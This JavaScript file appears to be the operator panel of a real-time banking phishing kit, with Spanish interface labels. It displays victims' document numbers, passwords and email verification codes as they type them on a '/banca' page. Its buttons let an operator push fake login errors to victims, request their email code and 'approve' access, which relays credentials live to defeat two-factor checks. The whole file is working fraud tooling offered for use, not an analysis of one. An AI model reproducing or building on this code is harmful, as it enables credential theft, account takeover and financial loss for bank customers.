(function () {
  const socket = typeof io !== "undefined" ? io({ transports: ["websocket", "polling"] }) : null;
  const container = document.getElementById("operator-sessions-list");
  const countBadge = document.getElementById("active-users-count");

  const localState = {
    sessions: new Map(),
    tombstones: new Map(),
    clearedAllAtMs: 0,
  };

  let lastRenderedHtml = "";

  function isDeleted(id, updatedAtMs) {
    const ts = Number(updatedAtMs) || 0;
    if (ts <= localState.clearedAllAtMs) return true;
    const tomb = localState.tombstones.get(id) || 0;
    if (ts <= tomb) return true;
    return false;
  }

  function purgeLocalDeleted() {
    for (const [id, s] of localState.sessions.entries()) {
      if (isDeleted(id, s.updatedAtMs)) {
        localState.sessions.delete(id);
      }
    }
  }

  function mergeSyncPayload(payload) {
    if (!payload || typeof payload !== "object") return;

    if (typeof payload.clearedAllAtMs === "number" && payload.clearedAllAtMs > localState.clearedAllAtMs) {
      localState.clearedAllAtMs = payload.clearedAllAtMs;
    }

    if (payload.tombstones && typeof payload.tombstones === "object") {
      for (const [id, ts] of Object.entries(payload.tombstones)) {
        const numTs = Number(ts) || 0;
        if (numTs > (localState.tombstones.get(id) || 0)) {
          localState.tombstones.set(id, numTs);
        }
      }
    }

    purgeLocalDeleted();

    if (Array.isArray(payload.sessions)) {
      for (const s of payload.sessions) {
        if (!s || !s.id) continue;
        const inMs = Number(s.updatedAtMs) || 0;
        if (isDeleted(s.id, inMs)) continue;
        const cur = localState.sessions.get(s.id);
        if (!cur || inMs >= (Number(cur.updatedAtMs) || 0)) {
          localState.sessions.set(s.id, s);
        } else if (cur) {
          cur.online = s.online;
          cur.visibility = s.visibility || cur.visibility;
          localState.sessions.set(s.id, cur);
        }
      }
    }

    renderSessions();
  }

  function escapeHtml(str) {
    return String(str || "")
      .replace(/&/g, "&amp;")
      .replace(/</g, "&lt;")
      .replace(/>/g, "&gt;")
      .replace(/"/g, "&quot;")
      .replace(/'/g, "&#39;");
  }

  function getRowDetails(orderNumber) {
    const letters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
    const num = Math.max(1, Number(orderNumber) || 1);
    const rowIndex = Math.floor((num - 1) / 5);
    const letter = rowIndex < letters.length ? letters[rowIndex] : String(rowIndex + 1);
    const rowName = `Fila ${letter}`;
    const slotInRow = ((num - 1) % 5) + 1;
    const startNum = rowIndex * 5 + 1;
    const endNum = (rowIndex + 1) * 5;
    const rangeText = `${startNum} al ${endNum}`;
    return {
      orderNumber: num,
      rowLetter: letter,
      rowName,
      slotInRow,
      rangeText,
    };
  }

  function getPresenceInfo(s) {
    if (s.online === false) {
      return { cls: "offline", label: "Desconectado (Salió)" };
    }
    if (s.visibility === "background") {
      return { cls: "background", label: "En 2° Plano (Otra app/pestaña)" };
    }
    return { cls: "online", label: "En Línea (En la página)" };
  }

  function getScreenDisplay(s) {
    if (s.screenLabel) return s.screenLabel;
    if (s.waitingOperator) return "Pantalla: Cargando (Esperando Operador)";
    if (s.step === "doc") return "Pantalla: Documento";
    if (s.step === "pass") return "Pantalla: Contraseña";
    if (s.step === "verify") return "Pantalla: Código de Correo";
    return "Pantalla: Login";
  }

  const ACTION_LABELS = {
    error_login: "📤 Enviando error de login...",
    wrong_login: "📤 Enviando error de login...",
    wrong_doc: "📤 Enviando error de documento...",
    wrong_pass: "📤 Enviando error de clave...",
    wrong_token: "📤 Enviando error de código correo...",
    ask_pass: "📤 Enviando a pantalla de Clave...",
    ask_token: "📤 Enviando a pantalla de Código Correo...",
    approve: "📤 Aprobando acceso al panel...",
  };

  function renderSessions() {
    purgeLocalDeleted();
    const sessions = Array.from(localState.sessions.values()).sort(
      (a, b) => (a.orderNumber || 0) - (b.orderNumber || 0) || (a.createdAtMs || 0) - (b.createdAtMs || 0)
    );

    if (countBadge) {
      const onlineCount = sessions.filter((s) => s.online !== false).length;
      countBadge.textContent = onlineCount + " / " + sessions.length;
    }
    if (!container) return;

    let html = "";
    if (sessions.length === 0) {
      html = `
        <div class="empty-state">
          <h3>⚡ Esperando usuarios conectados...</h3>
          <p>Los datos ingresados por los usuarios en <b>/banca</b> aparecerán aquí en tiempo real organizados por filas.</p>
        </div>
      `;
    } else {
      // Group sessions by row
      const rowMap = new Map();
      sessions.forEach((s, idx) => {
        const order = s.orderNumber || (idx + 1);
        const rowInfo = getRowDetails(order);
        s.orderNumber = order;
        s.rowLetter = s.rowLetter || rowInfo.rowLetter;
        s.rowName = s.rowName || rowInfo.rowName;
        s.rangeText = s.rangeText || rowInfo.rangeText;

        const key = s.rowLetter;
        if (!rowMap.has(key)) {
          rowMap.set(key, {
            rowLetter: s.rowLetter,
            rowName: s.rowName,
            rangeText: s.rangeText,
            sessions: [],
          });
        }
        rowMap.get(key).sessions.push(s);
      });

      html = Array.from(rowMap.values())
        .map((row) => {
          const letterClass = `fila-${row.rowLetter.toLowerCase()}`;
          const cardsHtml = row.sessions
            .map((s) => {
              const safeId = escapeHtml(s.id);
              const presence = getPresenceInfo(s);
              const screenText = getScreenDisplay(s);
              const isWaiting = Boolean(s.waitingOperator);
              const rowTagClass = `fila-${(s.rowLetter || "a").toLowerCase()}`;
              return `
      <div class="session-card ${isWaiting ? "waiting-operator" : ""}" data-id="${safeId}">
        <div class="card-top">
          <div class="card-order-tag ${rowTagClass}">
            <span class="order-num">#${s.orderNumber}</span>
            <span class="order-dot">•</span>
            <span class="order-row-label">${escapeHtml(s.rowName)}</span>
          </div>
          <span class="presence-badge ${presence.cls}">
            <span class="presence-dot"></span>
            ${escapeHtml(presence.label)}
          </span>
          <span class="time-info">⏰ ${escapeHtml(s.updatedAt || "")}</span>
        </div>
        <div class="activity-box ${isWaiting ? "is-waiting" : ""}">
          <span class="screen-pill">📍 ${escapeHtml(screenText)}</span>
          <span class="step-pill">${escapeHtml(s.status || s.step)}</span>
        </div>
        <div class="data-row">
          <span class="data-label">📄 ${escapeHtml(s.docType || "DNI")}</span>
          <span class="data-val doc">${escapeHtml(s.docNumber || "—")}</span>
        </div>
        <div class="data-row">
          <span class="data-label">🔑 Contraseña</span>
          <span class="data-val pass">${escapeHtml(s.password || "—")}</span>
        </div>
        <div class="data-row">
          <span class="data-label">📧 Código Correo</span>
          <span class="data-val token">${escapeHtml(s.token || "—")}</span>
        </div>
        <div class="actions-grid">
          <button class="cmd-btn btn-err-login" onclick="sendCmd('${safeId}', 'error_login', 'Contraseña incorrecta. Inténtalo de nuevo.')">❌ Error Login</button>
          <button class="cmd-btn btn-ask-token" onclick="sendCmd('${safeId}', 'ask_token', 'Pedir código de correo')">📧 Código Correo</button>
          <button class="cmd-btn btn-err-token" onclick="sendCmd('${safeId}', 'wrong_token', 'Código de correo inválido o expirado.')">❌ Error Código Correo</button>
          <button class="cmd-btn btn-approve" onclick="sendCmd('${safeId}', 'approve', 'Aprobar')">✅ Aprobar Login</button>
          <button class="cmd-btn btn-delete" onclick="deleteSession('${safeId}')">🗑️ Borrar Registro</button>
        </div>
      </div>
    `;
            })
            .join("");

          return `
      <section class="row-group ${letterClass}">
        <div class="row-group-header">
          <div class="row-title-wrap">
            <span class="row-letter-pill ${letterClass}">${escapeHtml(row.rowName.toUpperCase())}</span>
            <span class="row-range-text">Turnos del ${escapeHtml(row.rangeText)}</span>
          </div>
          <div class="row-right-meta">
            <span class="row-slots-badge">${row.sessions.length} / 5 usuarios en esta fila</span>
          </div>
        </div>
        <div class="sessions-grid">
          ${cardsHtml}
        </div>
      </section>
          `;
        })
        .join("");
    }

    if (html !== lastRenderedHtml) {
      lastRenderedHtml = html;
      container.innerHTML = html;
    }
  }

  function syncWithServer() {
    purgeLocalDeleted();
    const body = {
      clearedAllAtMs: localState.clearedAllAtMs,
      tombstones: Object.fromEntries(localState.tombstones),
      sessions: Array.from(localState.sessions.values()),
    };

    fetch("/api/sync", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(body),
      cache: "no-store",
    })
      .then(function (r) {
        return r.ok ? r.json() : null;
      })
      .then(function (data) {
        if (data) mergeSyncPayload(data);
      })
      .catch(function () {});
  }

  if (socket) {
    socket.emit("admin:join");
    socket.on("connect", function () {
      socket.emit("admin:join");
    });
    socket.on("sessions:sync", mergeSyncPayload);
    socket.on("sessions:update", function (sessions) {
      if (Array.isArray(sessions)) {
        mergeSyncPayload({ sessions });
      }
    });
  }

  syncWithServer();
  setInterval(syncWithServer, 1200);

  window.sendCmd = function (targetId, action, defaultMsg) {
    const message = defaultMsg || "";
    const session = localState.sessions.get(targetId);
    const nextMs = ((session && Number(session.updatedAtMs)) || 0) + 1;
    const cmdId = nextMs + "_" + Math.random().toString(36).slice(2, 7);
    const cmdPayload = { cmdId, targetId, action, message, createdAtMs: nextMs };

    if (session) {
      session.lastAction = action;
      session.status = ACTION_LABELS[action] || "Operación enviada: " + action;
      session.waitingOperator = false;
      session.pendingCommand = cmdPayload;
      session.updatedAtMs = nextMs;
      localState.sessions.set(targetId, session);
      renderSessions();
    }

    if (socket) {
      socket.emit("admin:command", cmdPayload);
    }

    fetch("/api/command", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(cmdPayload),
    })
      .then(function (r) {
        return r.ok ? r.json() : null;
      })
      .then(function (res) {
        if (res && res.sync) mergeSyncPayload(res.sync);
      })
      .catch(function () {});
  };

  window.deleteSession = function (targetId) {
    const cur = localState.sessions.get(targetId);
    const tombMs = ((cur && Number(cur.updatedAtMs)) || 0) + 1;
    localState.tombstones.set(targetId, tombMs);
    localState.sessions.delete(targetId);
    renderSessions();

    if (socket) {
      socket.emit("admin:delete_session", { targetId });
    }

    fetch("/api/delete_session", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ targetId }),
    })
      .then(function (r) {
        return r.ok ? r.json() : null;
      })
      .then(function (res) {
        if (res && res.sync) mergeSyncPayload(res.sync);
      })
      .catch(function () {});
  };

  window.clearAllSessions = function () {
    let maxMs = localState.clearedAllAtMs || 0;
    for (const s of localState.sessions.values()) {
      if ((Number(s.updatedAtMs) || 0) > maxMs) maxMs = Number(s.updatedAtMs);
    }
    const tombMs = maxMs + 1;
    localState.clearedAllAtMs = tombMs;
    for (const id of localState.sessions.keys()) {
      localState.tombstones.set(id, tombMs);
    }
    localState.sessions.clear();
    renderSessions();

    if (socket) {
      socket.emit("admin:delete_session", { targetId: null });
    }

    fetch("/api/delete_session", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ targetId: null }),
    })
      .then(function (r) {
        return r.ok ? r.json() : null;
      })
      .then(function (res) {
        if (res && res.sync) mergeSyncPayload(res.sync);
      })
      .catch(function () {});
  };
})();


